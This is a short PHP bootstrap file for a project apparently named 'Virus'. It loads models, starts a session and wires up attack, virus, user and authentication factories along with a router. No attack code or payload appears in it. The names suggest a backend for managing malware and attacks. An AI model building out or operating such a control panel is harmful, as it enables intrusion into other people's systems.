<?php /** @noinspection PhpIncludeInspection */

use Kelvinho\Virus\Attack\AttackFactory;
use Kelvinho\Virus\Auth\Authenticator;
use Kelvinho\Virus\Id\IdGeneratorImp;
use Kelvinho\Virus\Network\RequestData;
use Kelvinho\Virus\Network\Router;
use Kelvinho\Virus\Session\Session;
use Kelvinho\Virus\User\UserFactoryImp;
use Kelvinho\Virus\Virus\VirusFactory;

require_once(__DIR__ . "/consts.php");
require_once(__DIR__ . "/basics.php");
foreach (glob(__DIR__ . "/model/*.php") as $file) require_once($file);
foreach (glob(__DIR__ . "/model/*/*.php") as $file) require_once($file);
require_once(__DIR__ . "/model/Attack/autoload.php");

session_start();
$session = new Session();

$requestData = new RequestData();
$idGenerator = new IdGeneratorImp();
$userFactory = new UserFactoryImp();
$attackFactory = new AttackFactory();
$virusFactory = new VirusFactory($session, $attackFactory, $idGenerator);
$attackFactory->addContext($requestData, $session, $userFactory, $virusFactory, $idGenerator);
$router = new Router($requestData);
$authenticator = new Authenticator($session);

foreach (glob(__DIR__ . "/routes/*.php") as $file) require_once($file);
